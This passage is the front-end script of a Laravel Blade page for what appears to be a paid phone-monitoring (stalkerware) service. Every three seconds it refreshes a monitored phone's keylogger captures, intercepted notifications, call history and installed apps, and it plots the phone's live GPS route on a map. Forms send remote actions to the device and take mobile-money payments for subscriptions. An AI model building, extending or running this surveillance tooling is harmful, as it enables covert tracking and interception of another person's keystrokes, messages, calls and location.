                    $('[divab]').stop().fadeIn();
                    $('[remainaction]').html(subscription.remainaction);
                    $('[btnresetaction]').css('display', subscription.canreset ? 'block' : 'none').attr('phone', JSON
                        .stringify(phone));
                    $('[btninfo]').attr('phone', JSON.stringify(phone));
                    $('[btnpay]').attr('phone', JSON.stringify(phone));
                    $('[btnresetaction]').attr('phone', JSON.stringify(phone));
                    if (!subscription.active) {
                        $('[btnpay]').slideDown();
                    } else {
                        $('[btnpay]').slideUp();
                    }
                }

                getphoneapps();

                function getphoneapps() {
                    $('.input').attr('disabled', true);
                    $.ajax({
                        url: '{{ route('phoneapps') }}',
                        data: {
                            phone_id: phonesel.val()
                        },
                        success: function(phone) {
                            var txt = '';
                            var txt2 = '';
                            phone.apps.forEach(e => {
                                txt += `<option value="${e.id}">${e.name}</option>`;
                                txt2 += `<option value="${e.package}">${e.name}</option>`;
                            });
                            var sel = $('#phoneapps');
                            sel.select2('destroy');
                            sel.html(txt);
                            sel.select2({
                                closeOnSelect: false,
                                allowClear: true
                            });

                            sel = $('#phoneapps2');
                            sel.select2('destroy');
                            sel.html(txt2);
                            sel.select2({
                                closeOnSelect: false,
                                allowClear: true,
                                placeholder: "Selectionnez une application"
                            });
                            phoneStatus(phone);
                            reloadAll();
                        },
                        error: function() {
                            setTimeout(() => {
                                getphoneapps();
                            }, 1000);
                        }
                    }).always(function() {
                        $('.input').attr('disabled', false);
                    });
                }

                var dtResult = (new DataTable('[tresult]', {
                    searching: false,
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "result";
                            data.phone_id = phonesel.val();
                        },
                        dataSrc: function(json) {
                            phoneStatus(json.phone);
                            return json.data;
                        }
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'actionname',
                            name: 'actionname',
                            searchable: false,
                            orderable: false,
                        },
                        {
                            data: 'success',
                            name: 'success',
                            searchable: false,
                            orderable: false,
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap'
                        },
                        {
                            data: 'result',
                            name: 'result',
                            searchable: false,
                            orderable: false,
                            class: 'text-nowrap text-right'
                        },
                    ]
                }));

                /////////////
                var dtNotif = (new DataTable('[tnotif]', {
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "notif";
                            data.phone_id = phonesel.val();
                            data.phoneapps = JSON.stringify($('#phoneapps').val());
                            data.notificationdate = $('#notificationdate').val();
                        },
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'appname',
                            name: 'appname',
                        },
                        {
                            data: 'title',
                            name: 'title',
                        },
                        {
                            data: 'body',
                            name: 'body',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                    ]
                }));


                /////////////
                var dtKeylogger = (new DataTable('[tkeylogger]', {
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "keylog";
                            data.phone_id = phonesel.val();
                            data.keyloggerdate = keyloggerdate.val();
                        },
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 1,
                            width: '1%'
                        },
                        {
                            targets: 2,
                            className: 'ellipsis',
                        },
                        {
                            targets: 3,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'appname',
                            name: 'appname',
                        },
                        {
                            data: 'text',
                            name: 'text',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                        {
                            data: 'text0',
                            name: 'text0',
                            visible: false,
                        },
                    ]
                }));

                $('[tkeylogger] tbody').on('click', 'tr', function() {
                    var data = dtKeylogger.row(this).data();
                    var text0 = data.text0;
                    var tb = text0.split('@');
                    var app = tb[0] ?? '-';
                    tb.shift();
                    var txt = tb.join('');
                    var mdl = $('#minfo');
                    $('span[appname]', mdl).html(app);
                    $('.modal-body', mdl).html(txt);
                    new mdb.Modal(mdl[0], {
                        backdrop: 'static',
                    }).show();
                });

                /////////////
                var dtCalls = (new DataTable('[tcalls]', {
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "calls";
                            data.phone_id = phonesel.val();
                            data.calldate = calldate.val();
                        },
                    },
                    order: [
                        [0, "desc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'type',
                            name: 'type',
                        },
                        {
                            data: 'name',
                            name: 'name',
                        },
                        {
                            data: 'number',
                            name: 'number',
                        },
                        {
                            data: 'duration',
                            name: 'duration',
                        },
                        {
                            data: 'date',
                            name: 'date',
                            class: 'text-nowrap text-right'
                        },
                    ]
                }));


                /////////////
                var dtApps = (new DataTable('[tapps]', {
                    lengthMenu: [
                        [10, 25, 50, 100, -1],
                        [10, 25, 50, 100, "All"]
                    ],
                    processing: true,
                    serverSide: true,
                    ajax: {
                        url: "{{ route('remotecontol.index', ['datatable' => '']) }}",
                        data: function(data) {
                            data.type = "apps";
                            data.phone_id = phonesel.val();
                        },
                    },
                    order: [
                        [1, "asc"]
                    ],
                    columnDefs: [{
                            targets: 0,
                            width: '1%'
                        },
                        {
                            targets: 4,
                            width: '1%'
                        },
                    ],
                    columns: [{
                            data: 'id',
                            name: 'id'
                        },
                        {
                            data: 'name',
                            name: 'name',
                        },
                        {
                            data: 'package',
                            name: 'package',
                        },
                        {
                            data: 'installdate',
                            name: 'installdate',
                        },
                        {
                            data: 'is_uninstalled',
                            name: 'is_uninstalled',
                        },
                    ]
                }));

                function startWatch() {
                    let isDtResultInprogress = false;
                    setInterval(async () => {
                        if (isDtResultInprogress) return;
                        isDtResultInprogress = true;
                        var e = $('[tresult]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        e.css('visibility', 'hidden');
                        try {
                            await new Promise((resolve, reject) => {
                                dtResult.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}
                        isDtResultInprogress = false;
                        e.css('visibility', 'visible');
                    }, 3000);

                    let isDtNotifInprogress = false;
                    setInterval(async () => {
                        if (isDtNotifInprogress) return;
                        isDtNotifInprogress = true;

                        const processingEl = $('[tnotif]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtNotif.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtNotifInprogress = false;
                    }, 3000);

                    let isDtKeyloggerInprogress = false;
                    setInterval(async () => {
                        if (isDtKeyloggerInprogress) return;
                        isDtKeyloggerInprogress = true;

                        const processingEl = $('[tkeylogger]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtKeylogger.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtKeyloggerInprogress = false;
                    }, 3000);

                    let isDtCallsInprogress = false;
                    setInterval(async () => {
                        if (isDtCallsInprogress) return;
                        isDtCallsInprogress = true;

                        const processingEl = $('[tcalls]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtCalls.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtCallsInprogress = false;
                    }, 3000);


                    let isDtAppsInprogress = false;
                    setInterval(async () => {
                        if (isDtAppsInprogress) return;
                        isDtAppsInprogress = true;

                        const processingEl = $('[tapps]').closest('.dataTables_wrapper').find(
                            '.dataTables_processing');
                        processingEl.css('visibility', 'hidden');

                        try {
                            await new Promise((resolve, reject) => {
                                dtApps.ajax.reload(function(json) {
                                    resolve(json);
                                }, false);
                            });
                        } catch (error) {}

                        processingEl.css('visibility', 'visible');
                        isDtAppsInprogress = false;
                    }, 3000);

                }

                startWatch();

                var mapinitilized = false;
                var markerGroup = null;
                var map = null;
                let routeLine = null;
                let routeDecorator = null;

                function initmap() {
                    try {
                        const osmLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                            attribution: '© OpenStreetMap contributors',
                            minZoom: 0,
                            maxZoom: 21
                        });
                        const satelliteLayer = L.tileLayer(
                            'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                                attribution: '© Esri',
                                minZoom: 0,
                                maxZoom: 19
                            });

                        const savedLayer = localStorage.getItem('preferredMapLayer');
                        const initialLayer = (savedLayer === 'satellite') ? satelliteLayer : osmLayer;
                        map = L.map('map', {
                            gestureHandling: true,
                            fullscreenControl: true,
                            layers: [initialLayer],
                            center: [-11.653778234733284, 27.46004928023167],
                            zoom: 13,
                        });

                        map.on('baselayerchange', function(e) {
                            if (e.name === 'Satellite') {
                                localStorage.setItem('preferredMapLayer', 'satellite');
                            } else if (e.name === 'Plan') {
                                localStorage.setItem('preferredMapLayer', 'plan');
                            }
                        });

                        const baseMaps = {
                            "Plan": osmLayer,
                            "Satellite": satelliteLayer
                        };
                        L.control.layers(baseMaps).addTo(map);
                        markerGroup = L.layerGroup().addTo(map);
                        mapinitilized = true;
                    } catch (error) {}
                }
                initmap();

                function location(interval = true) {
                    $.ajax({
                        url: '{{ route('remotecontol.store') }}',
                        data: {
                            type: "location",
                            phone_id: phonesel.val(),
                            locationdate: locationdate.val(),
                        },
                        timeout: 20000,
                        success: function(data) {
                            if (!mapinitilized) {
                                initmap();
                            }

                            if (mapinitilized) {
                                markerGroup.clearLayers();
                                const latlngs = [];

                                data.forEach(point => {
                                    latlngs.push([point.latitude, point.longitude]);
                                });
                                if (routeLine) {
                                    map.removeLayer(routeLine);
                                    routeLine = null;
                                }

                                if (routeDecorator) {
                                    map.removeLayer(routeDecorator);
                                    routeDecorator = null;
                                }

                                routeLine = L.polyline(latlngs, {
                                    color: 'blue',
                                    weight: 2,
                                    opacity: 0.7,
                                    smoothFactor: 1
                                }).addTo(map);

                                routeDecorator = L.polylineDecorator(routeLine, {
                                    patterns: [{
                                        offset: '5%',
                                        repeat: '10%',
                                        symbol: L.Symbol.arrowHead({
                                            pixelSize: 8,
                                            polygon: true,
                                            pathOptions: {
                                                color: 'blue',
                                                fillOpacity: 1,
                                                weight: 0
                                            }
                                        })
                                    }]
                                }).addTo(map);

                                data.forEach((point, index) => {
                                    const lat = point.latitude;
                                    const lng = point.longitude;
                                    var islast = index == data.length - 1;

                                    const circleOptions = {
                                        radius: 6,
                                        fillColor: islast ? 'red' : (index == 0 ? 'yellow' :
                                            '#3388ff'),
                                        color: '#fff',
                                        weight: 2,
                                        opacity: 1,
                                        fillOpacity: 0.8,
                                    };

                                    const marker = L.circleMarker([lat, lng], circleOptions)
                                        .bindPopup(
                                            `<strong>Précision : ${point.accuracy}m | ${point.date}</strong>`
                                        );
                                    marker.on('mouseover', function(e) {
                                        this.openPopup();
                                    });
                                    markerGroup.addLayer(marker);
                                });

                                const lastPoint = data[data.length - 1];
                                if (lastPoint) {
                                    const lastLat = lastPoint.latitude;
                                    const lastLng = lastPoint.longitude;

                                    const lastIcon = new L.Icon({
                                        iconUrl: 'https://cdn.jsdelivr.net/gh/pointhi/leaflet-color-markers@master/img/marker-icon-red.png',
                                        shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/0.7.3/images/marker-shadow.png',
                                        iconSize: [35, 51],
                                        iconAnchor: [17, 51],
                                        popupAnchor: [1, -34],
                                        shadowSize: [41, 41]
                                    });

                                    const lastMarker = L.marker([lastLat, lastLng], {
                                        icon: lastIcon,
                                        zIndexOffset: 1000
                                    }).bindPopup(
                                        `<strong>Précision : ${lastPoint.accuracy}m | ${lastPoint.date}</strong>`
                                    );
                                    lastMarker.on('mouseover', function(e) {
                                        this.openPopup();
                                    });

                                    markerGroup.addLayer(lastMarker);

                                    const mapElement = document.getElementById('map');
                                    const isOnMap = mapElement && mapElement.matches(':hover');
                                    if (!isOnMap) {
                                        map.flyTo([lastLat, lastLng], 18);
                                        lastMarker.openPopup();
                                    }
                                }
                            }
                        },
                    }).always(function(s) {
                        if (interval) {
                            setTimeout(() => {
                                location();
                            }, 3000);
                        }
                    });
                }

                location();

                var faction = $('[f-action]');

                faction.submit(function() {
                    event.preventDefault();
                    var form = $(this);
                    var btn = $(':submit', form).attr('disabled', true);
                    var iclass = btn.find('i').attr('class');
                    btn.find('i').removeClass()
                        .addClass('spinner-border spinner-border-sm');
                    var data = form.serialize();
                    data += "&phone_id=" + phonesel.val();
                    rep = $('#repaction', form);
                    rep.stop().slideUp();
                    $.ajax({
                        url: '{{ route('remotecontol.store') }}',
                        type: 'POST',
                        data: data,
                        timeout: 20000,
                        success: function(res) {
                            if (res.success == true) {
                                rep.html(res.message).removeClass().addClass('alert alert-success')
                                    .slideDown();
                                dtResult.ajax.reload(null, false);
                                form[0].reset();
                                $('select', form).change();
                                setTimeout(() => {
                                    rep.stop().slideUp();
                                }, 3000);
                            } else {
                                var m = res.message + '<br>';
                                m += res.data?.errors_msg?.join('<br>') ?? '';
                                rep.html(m).removeClass().addClass('alert alert-danger')
                                    .slideDown();
                            }
                        },
                        error: function(resp) {
                            var mess = resp.responseJSON?.message ??
                                "Une erreur s'est produite, merci de réessayer";
                            rep.removeClass().addClass('alert alert-danger').html(mess).slideDown();
                        }

                    }).always(function(s) {
                        btn.attr('disabled', false).find('i').removeClass().addClass(iclass);
                    });
                });

                $('[f-edit]').submit(function() {
                    event.preventDefault();
                    var form = $(this);
                    var btn = $(':submit', form).attr('disabled', true);
                    var iclass = btn.find('i').attr('class');
                    btn.find('i').removeClass()
                        .addClass('spinner-border spinner-border-sm');
                    var data = form.serialize();
                    var phone_id = $('[name="phone_id"]', form).val();
                    rep = $('#rep', form);
                    rep.stop().slideUp();
                    $.ajax({
                        url: '{{ route('phone.update', '') }}/' + phone_id,
                        type: 'put',
                        data: data,
                        timeout: 20000,
                        success: function(res) {
                            if (res.success == true) {
                                rep.html(res.message).removeClass().addClass('alert alert-success')
                                    .slideDown();
                                phonesel.change();
                                setTimeout(() => {
                                    $('[data-dismiss="modal"]', form.closest('.modal'))
                                        .click();
                                }, 3000);
                            } else {
                                var m = res.message + '<br>';
                                m += res.data?.errors_msg?.join('<br>') ?? '';
                                rep.removeClass().addClass('alert alert-danger').html(m)
                                    .slideDown();
                            }
                        },
                        error: function(resp) {
                            var mess = resp.responseJSON?.message ??
                                "Une erreur s'est produite, merci de réessayer";
                            rep.removeClass().addClass('alert alert-danger').html(mess).slideDown();
                        }

                    }).always(function(s) {
                        btn.attr('disabled', false).find('i').removeClass().addClass(iclass);
                        setTimeout(() => {
                            rep.stop().slideUp();
                        }, 3000);
                    });
                });

                $('[btninfo]').click(function() {
                    var mdl = $('#mdlinfo');
                    var phone = JSON.parse($(this).attr('phone'));
                    var p = phone.phone;
                    new mdb.Modal(mdl[0], {
                        backdrop: "static"
                    }).show();
                    var form = $('[f-info]');
                    var ldr = $('[ldr]', form);
                    ldr.fadeIn();

                    $.ajax({
                        url: '{{ route('subcapability') }}',
                        data: {
                            phone_id: phone.id,
                        },
                        success: function(res) {
                            ldr.fadeOut();
                            $('#resinfo').html(res);
                        },
                        error: function(e) {
                            ldr.fadeOut();
                        }
                    });

                });

                $('[btnpay]').click(function() {
                    var mdl = $('#mdlpay');
                    var fp = $('[f-pay]');
                    var phone = JSON.parse($(this).attr('phone'));
                    var p = phone.phone;
                    if (phone.name) {
                        p += `<small> | ${phone.name}</small>`;
                    }
                    $('[payphone]', fp).html(p);
                    $('[name="phone_id"]', fp).val(phone.id);
                    subinfo(fp);
                    new mdb.Modal(mdl[0], {
                        backdrop: "static"
                    }).show();
                });
                $('[btnresetaction]').click(function() {
                    var mdl = $('#mdlpay2');
                    var fp = $('[f-pay2]');
                    var phone = JSON.parse($(this).attr('phone'));
                    var p = phone.phone;
                    if (phone.name) {
                        p += `<small> | ${phone.name}</small>`;
                    }
                    $('[payphone]', fp).html(p);
                    $('[name="phone_id"]', fp).val(phone.id);
                    subinfo(fp);
                    new mdb.Modal(mdl[0], {
                        backdrop: "static"
                    }).show();
                });


                var canreq = true;

                function callback(form) {
                    $.ajax({
                        url: '{{ route('api.check.pay') }}',
                        data: {
                            myref: REF,
                        },
                        success: function(res) {
                            var trans = res.transaction;
                            var status = trans?.status;
                            if (status === 'success') {
                                canreq = false;
                                $('[btncancel]', form).hide();
                                var btn = $(':submit', form).attr('disabled', false);
                                btn.html('<span></span> Payer');
                                rep = $('#rep', form);
                                rep.html(
                                    `<b>TRANSACTION EFFECTUEE !</b>`
                                ).removeClass();
                                rep.addClass('alert alert-success');
                                rep.slideDown();
                                setTimeout(() => {
                                    $('[data-dismiss="modal"]', form.closest('.modal'))
                                        .click();
                                }, 5000);
                            } else if (status === 'failed') {
                                canreq = false;
                                $('[btncancel]', form).hide();
                                var btn = $(':submit', form).attr('disabled', false);
                                btn.html('<span></span> Payer');
                                var rep = $('#rep', form);
                                rep.html(
                                    `<b>TRANSACTION ECHOUEE !</b><p>Vous avez peut-être saisi un mauvais Pin. Merci de réessayer.</p>`
                                ).removeClass();
                                rep.addClass('alert alert-danger');
                            } else {
                                if (canreq) {
                                    setTimeout(function() {
                                        callback(form);
                                    }, 2000);
                                }
                            }
                        },
                        error: function(e) {
                            setTimeout(function() {
                                callback(form);
                            }, 2000);
                        }
                    });
                }
                $('[btncancel]').click(function() {
                    $(this).hide();
                    var form = $(this).closest('form');
                    canreq = false;
                    var btn = $(':submit', form).attr('disabled', false);
                    btn.html('<span></span> Payer');
                    var rep = $('#rep', form);
                    rep.html("Paiement annulé.").removeClass();
                    rep.addClass('alert alert-danger');
                });

                $('[f-pay],[f-pay2]').submit(function() {
                    event.preventDefault();
                    var form = $(this);
                    var btn = $(':submit', form);
                    var rep = $('#rep', form);
                    rep.html('').removeClass();
                    var data = form.serialize();
                    canreq = true;

                    btn.attr('disabled', true).find('span').removeClass().addClass(
                        'spinner-border spinner-border-sm');
                    $.ajax({
                        url: '{{ route('api.init.pay') }}',
                        type: 'post',
                        data: data,
                        success: function(res) {
                            if (res.success) {
                                rep.html(res.message).removeClass();
                                rep.addClass('alert alert-success');
                                btn.html(
                                    '<i class="spinner-border spinner-border-sm"></i> Confirmez votre Pin au téléphone...'
                                );
                                btn.attr('disabled', true);
                                REF = res.data.myref;
                                $('[btncancel]', form).show();
                                callback(form);
                            } else {
                                rep.removeClass().addClass('alert alert-danger').html(res.message)
                                    .slideDown();
                                btn.attr('disabled', false).find('span').removeClass();
                            }
                        },
                        error: function(resp) {
                            var mess = resp.responseJSON?.message ??
                                "Une erreur s'est produite, merci de réessayer";
                            rep.removeClass().addClass('alert alert-danger').html(mess).slideDown();
                            btn.attr('disabled', false).find('span').removeClass();
                        }
                    });
                });

                function subinfo(form) {
                    var ldr = $('[ldr]', form);
                    ldr.slideDown();
                    var data = form.serialize();
                    $(':input', form).attr('disabled', true);
                    $.ajax({
                        url: '{{ route('subinfo') }}',
                        type: 'post',
                        data: data,
                        success: function(res) {
                            $(':input', form).attr('disabled', false);
                            ldr.slideUp();
                            $('[subamount]', form).html(res.subamount);
                            $('#paymt', form).val(res.payamount);
                        },
                        error: function() {
                            setTimeout(() => {
                                subinfo(form);
                            }, 2000);
                        }
                    });
                }

                $('[name="devise"], [name="subtype"]').change(function() {
                    var form = $(this).closest('form');
                    subinfo(form);
                });

                var subtype = $('[name="subtype"]');
                subtype.change(function() {
                    var form = $(this).closest('form');
                    showinfo()
                });

                function showinfo() {
                    var v = $('[name="subtype"]:checked').val();
                    if (v == 'basic') {
                        $('#premiuminfo').stop().slideUp();
                        $('#basicinfo').stop().slideDown();
                    } else {
                        $('#basicinfo').stop().slideUp();
                        $('#premiuminfo').stop().slideDown();
                    }
                }

                showinfo();
            });
        </script>
    @endif

@endsection
